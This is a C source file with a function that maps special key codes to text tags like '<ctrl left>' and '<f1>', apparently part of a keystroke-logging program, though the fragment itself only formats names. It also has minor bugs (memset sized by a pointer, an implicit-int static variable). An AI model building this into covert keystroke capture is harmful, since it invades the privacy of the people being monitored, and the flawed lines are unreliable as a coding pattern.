#include "keys.h"

void processKey(int chr, char* out) {
	static type;
	memset(out, 0, sizeof(out));
	switch (chr) {
		case CTRL_LEFT:
			strcpy(out, "\n<ctrl left>");
		break;
		
		case CTRL_RIGHT:
			strcpy(out, "\n<ctrl right>" );
		break;
		
		case TAB:
			strcpy(out, "\n<tab>");
		break;
		
		case BACKSPACE:
			strcpy(out, "\n<backspace>");
		break;
		
		case ESC:
			strcpy(out, "\n<esc>");
		break;
		
		case SHIFT_LEFT:
			strcpy(out, "\n<shift left>");
		break;
		
		case SHIFT_RIGHT:
			strcpy(out, "\n<shift right>");
		break;
		
		case WINDOWS:
			strcpy(out, "\n<windows>");
		break;
		
		case CAPSLOCK:
			strcpy(out, "\n<capslock>");
		break;
		
		case ENTER:
			strcpy(out, "\n<enter>");
		break;
		
		case LEFT_ARROW:
			strcpy(out, "\n<left arrow>");
		break;
		
		case RIGHT_ARROW:
			strcpy(out, "\n<right arrow>");
		break;
		
		case UP_ARROW:
			strcpy(out, "\n<up arrow>");
		break;
		
		case DOWN_ARROW:
			strcpy(out, "\n<down arrow>");
		break;
		
		case INSERT:
			strcpy(out, "\n<insert>");
		break;
		
		case DELETE:
			strcpy(out, "\n<delete>");
		break;
		
		case HOME:
			strcpy(out, "\n<home>");
		break;
		
		case END:
			strcpy(out, "\n<end>");
		break;
		
		case PAGE_UP:
			strcpy(out, "\n<page up>");
		break;
		
		case PAGE_DOWN:
			strcpy(out, "\n<page down>");
		break;
		
		case PAUSE:
			strcpy(out, "\n<pause>");
		break;
		
		case SCROLL_LOCK:
			strcpy(out, "\n<scroll lock>");
		break;
		
		case PRINTSCREEN:
			strcpy(out, "\n<printscreen>");
		break;
		
		case NUMLOCK:
			strcpy(out, "\n<numlock>");
		break;
		
		case F1:
			strcpy(out, "\n<f1>");
		break;
		
		case F2:
			strcpy(out, "\n<f2>");
		break;
		
		case F3:
			strcpy(out, "\n<f3>");
		break;
		
		case F4:
			strcpy(out, "\n<f4>");
		break;
		
		case F5:
			strcpy(out, "\n<f5>");
		break;
		
		case F6:
			strcpy(out, "\n<f6>");
		break;
		
		case F7:
			strcpy(out, "\n<f7>");
		break;
		
		case F8:
			strcpy(out, "\n<f8>");
		break;
		
		case F9:
			strcpy(out, "\n<f9>");
		break;
		
		case F10:
			strcpy(out, "\n<f10>");
		break;
		
		case F11:
			strcpy(out, "\n<f11>");
		break;
		
		case F12:
			strcpy(out, "\n<f12>");
		break;
		
		default:
			if (type == SPECIAL) {
				sprintf(out, "\n%c", chr);
			} else {
				sprintf(out, "%c", chr);
			}
			
			type = NORMAL;
			return;
	}
	type = SPECIAL;
}
